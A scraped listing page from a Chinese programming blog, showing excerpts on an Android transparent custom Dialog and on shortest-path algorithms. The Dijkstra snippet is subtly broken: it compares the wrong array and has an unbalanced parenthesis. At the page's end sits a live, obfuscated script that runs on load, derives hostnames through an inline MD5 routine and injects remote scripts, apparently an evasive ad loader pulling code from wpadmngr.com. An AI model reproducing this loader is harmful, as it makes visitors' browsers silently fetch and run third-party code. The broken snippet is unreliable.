第一步: 给Dialog设置一个风格主题（基本都是用这个主题）无边框全透明背景： &lt;!--自定义dialog背景全透明无边框theme --&gt; &lt;style name="MyDialog" parent="android:style/Theme.Dialog"&gt; &lt;!--背景颜色及和透明程度--&gt; &lt;item name="android:windowBackground"&gt;@android:color/transparent&lt;/item&gt; &lt;!--是否去除标题 --&gt; &lt;item name="android:windowNoTitle"&gt;true&lt;/item&gt; &lt;!--是否去除边框--&gt; &lt;item name="android:windowFrame"&gt;@null&lt;/item&gt; &lt;!--是否浮现在activity之上--&gt; &lt;item name="android:windowIsFloating"&gt;true&lt;/item&gt; &lt;!--是否模糊--&gt; &lt;item name="android:backgroundDimEnabled"&gt;false&lt;/item&gt; &lt;/style&gt; 第二步：给自定的Dialog设置自定义的 xml界面,我这里只是示范，你可以使用单选，多选，3个按钮，4个按钮等等，格式各样的自定义XML，我这里就定义了 标题title，信息message，还有一个确定按钮和取消按钮，如下： &lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android" android:layout_width="match_parent" android:layout_height="match_parent" android:background="#11ffffff"&gt; &lt;LinearLayout android:layout_width="260dp" android:layout_height="wrap_content" android:layout_centerInParent="true" android:background="@drawable/free_dialog_bg" android:orientation="vertical"&gt; &lt;TextView android:id="@+id/title" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_gravity="center" android:layout_margin="15dp" android:gravity="center" android:text="消息提示" android:textColor="#38ADFF" android:textSize="16sp" /&gt; &lt;TextView android:id="@+id/message" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginLeft="20dp" android:layout_marginRight="20dp" android:text="提示消息" /&gt; &lt;View android:layout_width="match_parent" android:layout_height="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/71e61a9aa74732b491165ac250a7cef7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5c2dfc9b01e91a8ec1dd3f30998a27fb/" rel="bookmark">
			最短路问题的五种算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		单元最短路和多源汇最短路的适用算法 摘要单源最短路： 一个点到其他点的最短路。多源汇最短路： 任意两点间的最短路。图的存储方式朴素Dijkstra堆优化DijkstraBellman-Ford求总路径条数不多于K条的最短路径 SPFA堆优化Dijkstra和SPFA的区别和优缺点用SPFA判断负环 Floyd总结 基础算法合集：
https://blog.csdn.net/GD_ONE/article/details/104061907
摘要 本文主要介绍关于图的最短路的五种常用算法和其应用。朴素Dijkstra， 堆优化Dijkstra，Bellman-Ford，SPFA， Floyd。这几种算法有各自的优势和劣势，适用于不同的场景。
另：本篇文章篇幅较长，但难度不大， 建议学习算法的同时，自己手动画图，并模拟算法流程，将会一目了然，所见即所得！
单源最短路： 一个点到其他点的最短路。 无负边权时适用算法(所有边长都为正数)：
稠密图： 朴素Dijkstra
稀疏图： 堆优化Dijkstra, SPFA
有负边权时适用算法：
SPFABellman-Ford 求有边数限制的单源最短路：
Bellman-Ford 多源汇最短路： 任意两点间的最短路。 Floyd 图的存储方式 存储稠密图时，使用邻接矩阵。
存储稀疏图时，使用邻接表。
稠密图是指边数远大于点数，稀疏图是边数和点数差不多相等。
以n表示点数， m表示边数，
一般来说题目数据是n &lt; 100, m &lt; 10000 的图是稠密图， 是n&lt;10000, m&lt;10000的图是稀疏图。
朴素Dijkstra 算法思想：
朴素DijKstra的思想是通过一个距离起点A最近的点B，缩短起点A通过点B到达其他点的距离，因为只有通过距离起点最近的点，才有可能缩短起点到达其他点的距离。
所以一共分两步：
第一步：找到距离起点最近的点。
第二步：通过该点缩短起点到达其他点的距离。
比如：
对于AB和AC， AB为3， AC 为6，AB是A到其他点的最短距离，如果AC有可能更小的话，那么一定是经过B。原本A到C是6， 但经过B， ABC的距离是4.所以AC的最短距离是4.
所以怎么实现呢？
我们设置一个dis数组，来表示其他点到起点的最短距离。起点到起点的距离是0,所以dis[1] = 0， 其他点现在到起点的距离全部设为正无穷。然后，我们要找到一个距离起点最近点。用一个循环遍历一下。 int t = -1; // 表示还没有处理过的距离起点最近的点。 // 找出距离起点最近的点。 for(int j = 1; j &lt;= n; j++){ if(st[j]==0 &amp;&amp; (t==-1 || st[t] &gt; st[j]) t = j; } 最终t就是我们找到的还没有处理过的距离起点最近的点。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5c2dfc9b01e91a8ec1dd3f30998a27fb/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/101/">«</a>
	<span class="pagination__item pagination__item--current">102/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/103/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>